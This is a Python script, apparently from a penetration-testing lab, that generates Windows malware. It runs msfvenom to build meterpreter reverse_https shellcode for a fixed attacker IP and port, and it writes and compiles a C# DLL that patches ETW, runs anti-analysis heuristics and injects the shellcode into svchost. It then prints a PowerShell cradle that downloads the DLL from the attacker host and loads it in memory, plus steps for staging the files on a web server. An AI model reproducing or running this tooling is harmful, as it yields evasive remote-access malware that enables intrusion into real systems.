#!/bin/env python3
from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_ps_dll_runner'
#ENCODER="x64/xor_dynamic"
#ENCODER="x64/zutto_dekiru"
ENCODER="generic/none"
MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
MSFVENOM32_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
XOR_KEY = b'\x00'
WEBROOT = "/var/www/html"
SHELLCODE_PATH = "/sc"
SHELLCODE32_PATH = "/sc32"
STAGER_URL = f"http://{LHOST}/sc"

def generate():
  svchost_path = Obfuscator(SVCHOST_PATH)

  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LeMans
{{
    public class Class1
    {{
        {START_PROCESS_INJECT_IMPORT}
        {HEURISTICS_IMPORT}
        {ARCH_DETECTION}
        {ETW_FUNCS}

        public static void ferrari()
        {{
            {HEURISTICS_CODE}
            {ETW_PATCH}
            {URL_DL_CODE}

         {START_PROCESS_INJECT}

        }}
    }}
}}
""".format(HEURISTICS_IMPORT=HEURISTICS_IMPORT,
           HEURISTICS_CODE=HEURISTICS_CODE,
           ARCH_DETECTION=ARCH_DETECTION,
           ETW_FUNCS=ETW_FUNCS,
           ETW_PATCH=ETW_PATCH,
           URL_DL_CODE=url_dl_code,
           START_PROCESS_INJECT_IMPORT=START_PROCESS_INJECT_IMPORT,
           START_PROCESS_INJECT=START_PROCESS_INJECT)

  print(template)
  f = open(BASE_FILENAME + '.cs', "w")
  f.write(template)
  f.close()

def compile():
  cmd = f"mcs /target:library {BASE_FILENAME}.cs"
  os.system(cmd)

def generate_shellcode():
  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
  shellcode32 = ShellCode(MSFVENOM32_CMD, xor_key=XOR_KEY)

  # Write 64bit shellcode
  f = open(BASE_FILENAME + '.sc', "wb")
  f.write(shellcode.get_bytes())
  f.close()
  print("Wrote " + BASE_FILENAME + '.sc')

  # Write 32bit shellcode
  f = open(BASE_FILENAME + '.sc32', "wb")
  f.write(shellcode32.get_bytes())
  f.close()
  print("Wrote " + BASE_FILENAME + '.sc32')

def main():
  generate()
  compile()

  generate_shellcode()

  print("Load with:")
  ps = """
$data = (New-Object System.Net.WebClient).DownloadData('http://{LHOST}/{fn}')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType('LeMans.Class1')
$method = $class.GetMethod("ferrari")
$method.Invoke(0, $null)
""".format(fn=BASE_FILENAME + '.dll', LHOST=LHOST)
  print(ps)

  print("Run the following:")
  print("cp " + BASE_FILENAME + '.dll ' + WEBROOT + "/" + BASE_FILENAME + '.dll')
  print("cp " + BASE_FILENAME + ".sc " + WEBROOT + SHELLCODE_PATH)
  print("cp " + BASE_FILENAME + ".sc32 " + WEBROOT + SHELLCODE32_PATH)

if __name__ == "__main__":
  main()
